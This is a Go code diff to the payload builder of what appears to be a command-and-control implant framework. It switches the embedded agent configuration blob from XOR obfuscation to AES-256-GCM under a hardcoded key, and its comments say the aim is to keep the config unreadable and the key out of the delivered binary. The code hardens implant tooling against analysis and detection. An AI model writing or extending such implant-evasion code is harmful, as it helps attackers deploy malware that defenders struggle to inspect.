@@ -1,6 +1,8 @@
 package payload
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/hex"
@@ -54,19 +56,35 @@ type agentConfigJSON struct {
 	MalleableAppend  string `json:"malleable_append"`
 }
 
-// obfuscateBlob XOR-obfuscates the config blob with a fresh random key so the
-// embedded config is not directly greppable. Format: <hex-key>:<base64-data>,
-// the same scheme used by the agent's own string table.
+// configBlobKeyHex is the AES-256 key material (64 hex chars) shared with the
+// agent. The agent binary only ever carries it through the strxor table
+// (SConfigKey, re-encoded with a fresh XOR key every build), so the plaintext
+// key never appears in the delivered binary — only in this builder source.
+const configBlobKeyHex = "947ce1b2f693c5a0f79e7ab52674948b9e4fbc7ff39ae4021d98612e07d05a96"
+
+// obfuscateBlob encrypts the config blob with AES-256-GCM using the shared
+// builder key. Format: base64(nonce || ciphertext || tag). Unlike the old XOR
+// scheme (where the key travelled alongside the data in the blob) the cipher
+// is authenticated and the key is not recoverable from the blob alone.
 func obfuscateBlob(plaintext []byte) string {
-	key := make([]byte, len(plaintext))
-	if _, err := rand.Read(key); err != nil {
+	key, err := hex.DecodeString(configBlobKeyHex)
+	if err != nil {
 		return ""
 	}
-	enc := make([]byte, len(plaintext))
-	for i := range plaintext {
-		enc[i] = plaintext[i] ^ key[i]
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return ""
 	}
-	return hex.EncodeToString(key) + ":" + base64.StdEncoding.EncodeToString(enc)
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return ""
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := rand.Read(nonce); err != nil {
+		return ""
+	}
+	sealed := gcm.Seal(nonce, nonce, plaintext, nil)
+	return base64.StdEncoding.EncodeToString(sealed)
 }
 
 // buildConfigBlob serializes the resolved implant configuration into the
